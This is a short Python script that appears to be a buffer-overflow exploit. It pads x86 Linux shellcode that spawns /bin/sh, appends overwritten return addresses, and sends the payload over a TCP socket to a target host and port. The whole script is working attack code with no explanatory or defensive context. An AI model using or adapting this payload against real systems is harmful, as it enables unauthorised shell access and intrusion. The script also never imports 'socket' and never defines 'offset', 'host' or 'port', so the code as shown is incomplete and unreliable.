from _struct import Struct
s = Struct.__new__(Struct)
s.format = 'I'
s.size = 4

def p32(val):
    return s.pack(val)

target = 0x08049b28
base = 0x0804b000

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"

payload = shellcode + 'Z' * (offset - len(shellcode))
payload += p32(target + 0x5)
payload += p32(base + len(payload))

backdoor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
backdoor.connect((host, port))
backdoor.send(payload)
backdoor.close()
